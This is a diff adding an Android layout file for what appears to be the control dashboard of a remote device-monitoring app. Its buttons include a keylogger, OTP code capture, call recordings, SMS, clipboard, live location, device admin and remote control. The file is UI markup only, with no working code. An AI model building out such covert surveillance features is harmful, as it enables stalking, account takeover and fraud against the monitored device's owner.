@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#0D1626"
+    android:padding="16dp">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical">
+
+        <TextView
+            android:id="@+id/tvStatus"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Connected"
+            android:textColor="#00FF88"
+            android:textSize="16sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="8dp"/>
+
+        <TextView
+            android:id="@+id/tvDeviceInfo"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Device Info..."
+            android:textColor="#FFFFFF"
+            android:textSize="14sp"
+            android:layout_marginBottom="4dp"/>
+
+        <TextView
+            android:id="@+id/tvLocation"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Location..."
+            android:textColor="#AAAAAA"
+            android:textSize="14sp"
+            android:layout_marginBottom="16dp"/>
+
+        <Button android:id="@+id/btnAllCommands" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="All Remote Commands (180)" android:backgroundTint="#00897B" android:textColor="#FFFFFF" android:layout_marginBottom="10dp"/>
+        <Button android:id="@+id/btnCallRecordings" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Call Recordings" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnPhotos" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Captured Photos" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnScreenTime" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Screen Time" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnAlertWords" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Alert Words" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnNightMode" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Night Mode" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnContactBlock" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Contact Block" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnAlerts" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Alerts &amp; Notifications" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnKeylogs" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Keylogger" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnClipboard" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Clipboard" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnWifi" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="WiFi &amp; Network" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnBrowser" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Browser History" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnDeviceInfo" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Device Hardware Info" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnOtp" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="OTP Codes" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnAppUsage" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="App Usage" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnScreenshots" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Screenshots" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnLiveStream" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Live Stream &amp; Remote Control" android:backgroundTint="#C2185B" android:textColor="#FFFFFF" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnAdminControl" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Device Admin" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnScreenRecordings" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Screen Cast &amp; Recordings" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnBlockApps" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="App Blocking" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnContacts" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Contacts" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnSms" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="SMS" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnCallLogs" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Call Logs" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnNotifications" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Notifications" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnSocial" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Social Media" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnLocation" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Live Location" android:layout_marginBottom="6dp"/>
+        <Button android:id="@+id/btnUnlink" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Unlink Device" android:backgroundTint="#D32F2F" android:textColor="#FFFFFF" android:layout_marginTop="16dp" android:layout_marginBottom="24dp"/>
+
+    </LinearLayout>
+</ScrollView>
